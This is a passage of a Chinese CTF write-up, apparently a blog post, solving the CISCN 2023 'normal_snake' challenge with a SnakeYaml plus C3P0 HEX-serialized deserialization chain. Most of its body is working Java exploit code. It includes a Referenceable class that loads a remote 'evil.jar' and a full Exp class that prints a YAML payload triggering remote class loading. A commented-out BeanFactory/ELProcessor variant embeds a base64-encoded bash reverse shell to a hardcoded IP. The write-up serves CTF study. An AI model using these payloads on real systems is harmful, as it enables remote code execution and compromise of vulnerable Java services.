+<p>那么只能自己写一个实现 ConnectionPoolDataSource 接口的类但是不可被序列化的类，也关系到这个题的exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/evil.jar&quot;</span>);<br>        <span class="hljs-keyword">return</span> reference;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：BeanFactory不出网"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：BeanFactory不出网" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：BeanFactory不出网"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：BeanFactory不出网</h3><p><a target="_blank" rel="noopener" href="https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">JAVA反序列化之C3P0不出网利用</a> 和 JNDI 高版本注入很像。</p>
+<p>关于JNDI高版本注入，这个我在之前的博客就分析了：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">绕过JDK高版本限制进行JNDI注入 - Eddie_Murphy - 博客园 (cnblogs.com)</a></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>言归正传，回到怎么打题目本身。</p>
+<p>题目入口是 yaml.load，还给了 C3P0 依赖，又过滤了 jndi 之类的关键字，所以能想到肯定是 <strong>SnakeYaml + C3P0 的 HEX 二次反序列化</strong>。</p>
+<p>根据上面的 5 条 C3P0 利用链，选择 SnakeYaml 反序列化触发原生反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource#setUserOverridesAsString --&gt; ObjectInputStream#readObject<br></code></pre></td></tr></table></figure>
+
+<p>然后再触发远程类加载或者jndi注入:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; InitialContext#lookup<br>or<br>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; com.mchange.v2.naming.ReferenceableUtils#referenceToObject --&gt; URLClassLoader<br></code></pre></td></tr></table></figure>
+
+<p>借用原作者 URLClassLoader 远程加载类POC直接打了。</p>
+<p><img src="/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805003817800.png" srcset="/img/loading.gif" lazyload alt="image-20240805003817800"></p>
+<p>入口很显然在这个yaml.load，这里我使用的方法是C3P0的HEX序列化字节加载器，SnakeYaml就起到一个调用<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>的作用。</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snakeyaml;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/&quot;</span>);<br><span class="hljs-comment">//            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#x27;bash -c \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#x27;)&quot;));</span><br><span class="hljs-comment">//            return resourceRef;</span><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        C3P0 c3P0=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0</span>();<br>        PoolBackedDataSourceBase poolBackedDataSourceBase=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//有参构造方法是public</span><br>        Field connectionPoolDataSource=poolBackedDataSourceBase.getClass().getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        connectionPoolDataSource.setAccessible(<span class="hljs-literal">true</span>);<br>        connectionPoolDataSource.set(poolBackedDataSourceBase,c3P0);<br>        String hex=byteArrayToHexString(serialize(poolBackedDataSourceBase));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml=new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br><span class="hljs-comment">//        byte[] result=serialize(poolBackedDataSourceBase);</span><br><span class="hljs-comment">//        unserialize(result);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream outputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        outputStream.writeObject(object);<br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ByteArrayInputStream byteArrayInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(s);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">byteArrayToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] byteArray)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : byteArray) &#123;<br>            sb.append(String.format(<span class="hljs-string">&quot;%02X&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload记得URL编码：</p>
+<p><img src="/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004855145.png" srcset="/img/loading.gif" lazyload alt="image-20240805004855145"></p>
+<p><img src="/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004832508.png" srcset="/img/loading.gif" lazyload alt="image-20240805004832508"></p>
+<p>环境变量拿下flag：</p>
+<p><img src="/2024/07/28/Commons-Collections/-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004825368.png" srcset="/img/loading.gif" lazyload alt="image-20240805004825368"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake - B0T1eR - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.aiwin.fun/index.php/archives/1677/#cl-10">CTF-Java题记录 - 首页|Aiwin</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从CISCN2023-华北-normal_snake看Snakeyaml和C3P0缝合</div>
+      <div>https://eddiemurphy89.github.io/2024/08/05/从CISCN2023-华北-normal-snake看Snakeyaml和C3P0缝合/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>EddieMurphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/05/C3P0/" title="C3P0">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">C3P0</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="二次反序列化">
+                        <span class="hidden-mobile">二次反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
